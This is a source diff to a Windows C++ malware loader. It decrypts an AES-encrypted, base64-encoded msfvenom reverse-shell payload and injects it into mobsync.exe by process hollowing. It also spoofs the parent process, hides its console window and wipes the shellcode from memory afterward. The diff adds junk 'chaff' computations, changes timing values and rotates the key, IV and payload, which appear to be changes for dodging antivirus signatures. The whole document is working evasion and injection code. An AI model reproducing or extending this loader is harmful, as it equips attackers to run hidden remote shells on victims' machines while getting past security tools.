@@ -5,6 +5,7 @@
 #include "aes.hpp"
 #include "base64.h"
 #include "low.h"
+#include "chaff.h"
 
 // This is just directly stolen from ired.team
 DWORD get_PPID() {
@@ -24,7 +25,7 @@ DWORD get_PPID() {
 }
 
 // Process Hollowing
-VOID hollow(std::vector<byte> payload)
+VOID hollow(std::vector<byte> payload, chaff c)
 {
     STARTUPINFOEXA si;
     PROCESS_INFORMATION pi;
@@ -42,6 +43,7 @@ VOID hollow(std::vector<byte> payload)
     si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
     InitializeProcThreadAttributeList(NULL, 2, 0, &size);
     si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+    c.fib();
 
     // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
     InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
@@ -52,7 +54,7 @@ VOID hollow(std::vector<byte> payload)
     HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
     UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);
 
-    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
+    LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";
     if (!CreateProcess(
         hollow_bin,			// LPCWSTR Command (Binary to Execute)
         NULL,				// Command line
@@ -68,10 +70,10 @@ VOID hollow(std::vector<byte> payload)
         &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
     )) {
         DWORD errval = GetLastError();
-        std::cout << "[!] ERROR" << errval << std::endl;
+        std::cout << "whoops " << errval << std::endl;
     }
 
-    WaitForSingleObject(pi.hProcess, 1500);
+    WaitForSingleObject(pi.hProcess, 1400);
     hProcess = pi.hProcess;
     hThread = pi.hThread;
 
@@ -83,7 +85,7 @@ VOID hollow(std::vector<byte> payload)
     NtResumeThread(hThread, NULL);
 
     // Overwrite shellcode with null bytes
-    Sleep(10000);
+    Sleep(9999);
     uint8_t overwrite[500];
     NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
 
@@ -92,6 +94,10 @@ VOID hollow(std::vector<byte> payload)
 
 int main()
 {
+    chaff c = chaff();
+    c.fib();
+    c.prime();
+
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // Disallow non-MSFT signed DLL's from injecting
@@ -105,15 +111,16 @@ int main()
 
     // Decode shellcode and load into uint8_t vector for decryption
     // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
-    shellcode = "5WJDDSbb0Kh7+npFtMpwoO6jJwQ6LKvoys6rZ9I+LFIfr6sCjINscuKryZ3q7PKKSkEwiF2DQQYDYJyNGP+LCc3xF3RIlCrrM5TPrze2E64GKNJwmmLLpvGGAM6B0xrp3OARcAgXzksNxR2mmXx1CFgJfc+pe0xsUQylgSEW9lmZsjifE87bs9XEz45SwmBKAJyR3UE0PZyjsr/FqWmZN0W0sLWsiQPo618CepCkfq5ZVF/V2iUR6+y7XQPlz2WfprshOaGqv48o6AKVMwLAyJ6iqVq2X8LzagEdGLzOUVXkJAgzntp0e7C9IgxW8O1THI0dB9GDjsn+tS1gitYLJ+7lUEYBVnrjCWB2IaQdDiRJ+5ZK/R8F6whOITEf+VpB/EJ1DofH56MDbGo+WkDzsdHnG2drtiYTXXdweqGiJzCBwYNjzGB2s4xW8JfKWjBvDerO22TBbpp21/AJDtHt/eaLXmzjsVxPT5GNF2lZkQf04VQVpoFKV1VvSPEhFVeT1vRN+f6e6XCiMSU8ziPbl9B5kgYrRq51TOD4zmuOysGa4Klt51nnmyxFsq/4Xx4kOioZTf2/oJ7X7UUVFaM0YqwHht5Vaf6RmnGVwwooxAnqx2MdnJTx2dhoCk3MxVMTDtt7sdwiAYIM4Ekr4rXRntmCHebl17bbVdqBdTZM/u9Ggh7le4gemOdT4ag2WRhEVTbbiTRCsarVmIPWeB17p5qzw0XbyweWNl/kOJZsaaHKOnR3Zy0mG9a8SORmJTs/E7nPpb5gVFiaSdwDPs3qRklNbZwd+QbL6LJdCZsDMuY69z93X2gyHc60yVpcJTGd07iqwotmCIf80AlcpjjrkiTy5xwT7s62dE7Gs/ZphRuRHHS9UCLwqC85dBY08fqalmvoC59EdwXw8y+YFD2kC3vDtELY0hM4kZ+669al0XytP+22ju3mbmA2agv4Axr7xUo8eXxVA1Ov6exWymhnq92CqhGbh7tFcL9Zcq2431M5K2k3ZmGUVxiHZRyfOZv6ZopIrp81P6jtUNkQN9Ud51HMuh4iVrZsbMZ+Bo6W506roPSQCIYZUiz7rOq4Ai+omnaY+5+sRZ+QllV8t6cZhY+vipbX6+p+QMzhGYLDFJJKK6Zql3Zo49EZetF3rgItGea/d5QTYwCATPjrMeHjvSkapak7ifC54+hWLvq9QDukoWaT+3BirHHDZHvhlguVpk+MwENoLACsZiJ/sH9ylA==";
+    shellcode = "cYylIwGpiexlI6YOl8xPDHoe1GzU0Tkxnyb8Z/MmxtZvK8yzeXWgp0mAwfsSK9eNaUx63whIZP3mzebi5M3s/OPXmivNnImmTw3iqAmL0I4gl+RzuJ6Wx58LikDVJnJLMgBMds9h/BnNi5Fy6SqQlZ3zDTT77HMOWMM/3TtvNPRfT6RGxyeqJkX0HNXnDljB9jbnkh6lrOFWzGF5CfB9JLsHXQ9f1ipyQ7wdzL7NNwER/TZATjokbkT/c9kEddOXNsBHLxSyPgdgaPtgRsJq2LeszOIhjHNdfKATYAZ+ntiPBW5AKFqILtjqSeNmH8LMhwpKuALXbVMGlvmP02Sol0r1W0l23qLEJwmjV7CwUj2rqp9SpIXLpM6FP0MdrFTUGLrr/YfQwPkCaE2MdUAn3wd5i3NqlKRCTJLq4XqFAy2lEmmg/GDJYggXAmpNMCBSermMQ5OSdRnxO50pxhxjnBY08ilZ0Vpf007Gy69auXRcJZ2TCDIneCJ/oamMubMLQBegSwOow8fJIDvZ5tJXSwrJrz1ETtphSRn2TpeOtYAP5wIJ+xNoXH0YEa0EJXcjgIGnpqcgpRNyErO/DDmjCkJQFCvlqKqC5A/49ZfbUUvEPM61Ew9Kp+xb8v1RYTWw5mFsrSMKnIaMxjREJl+O7B6VmtjmDRMthpjb2Q03lE6dKkCgWj2ilLKKpr6JDbZEqnRN4A1lgLw/MXHE1i/WFjryfgGkEEjoW6AUqK0D7TF6AyRsyjaHzVtsQqGKvx7unMRPFnG18aNkV8/wYZLcPQVmR5OVDDV4xgRTjl7Ao63rx8cQ84PyBauf+eUhCEWNNKIaJ8TqO2AbwxLOQbuj+9/vF3G/dcgxoyCccs7MIANkU1dH+MAuNY1yGQGgTQK5i4Zeawbr+9HOkAZtLDIMxVetEqiX93N0evU1Zvrkors9W1vnmK2ueNd9VBHovqEFC2LRGqqPLBGYEgY2E/8yQGgsm+UvwEv4FZ9Nz3N0+XS8DAak7ZCZy7WilAF58MKKN6gnaPqVZPGIRtH5F67fu7SYz5z/AgWUSgbecChbZnGHBE41ibdVs+JOzP7pRPzGXJETDQGAHcjP7hv3/Q8ySKalDWwaNe/wQ505xIheCOVWKhk8wf+V1LhVmBt2PTEBdad2bydRUe02HtIUSns6TDpLNmEzwXzMNMPobHWk8LvS1u++uhZ4EUI6eqGsBtY4DwhywiDsz8XxOtaemjE6bzPclD/Yrop5mPdO+UodsoQ=";
+
     decoded = b64.base64_decode(shellcode);
     ciphertext.clear();
     std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
 
     // AES Decryption Objects
     struct AES_ctx e_ctx;
-    uint8_t key[32] = {0x9e,0x91,0x45,0x7a,0xa1,0x32,0xe1,0x09,0x16,0xb2,0x09,0xee,0xff,0x6f,0x7a,0x44,0xfd,0xd8,0x12,0x90,0xd7,0xd0,0xdf,0x39,0x0a,0x46,0x7b,0x9a,0x52,0xe8,0x2e,0xd6};
-    uint8_t iv[16] = {0xdb,0x03,0xef,0xe3,0xcf,0xb6,0x5a,0x33,0xe2,0x6b,0x41,0x51,0xc2,0xd2,0xb4,0x46};
+    uint8_t key[32] = {0x45,0x82,0xad,0x5c,0x8f,0xd5,0x1d,0x9f,0x73,0x34,0xf4,0xba,0x35,0xe0,0x47,0x13,0x53,0xa5,0xe9,0xa0,0x86,0xb8,0x39,0xd5,0x32,0xa6,0xa8,0xa6,0xfb,0xca,0x6e,0x5d};
+    uint8_t iv[16] = {0x24,0xb2,0xd5,0xc5,0xa4,0x82,0xef,0xe1,0xa1,0xc4,0x21,0xcd,0x11,0x53,0xd2,0x92};
     
     AES_init_ctx_iv(&e_ctx, key, iv);
 
@@ -141,7 +148,7 @@ int main()
         }
     }
 
-    hollow(recovered);
+    hollow(recovered, c);
     return 0;
 }
 
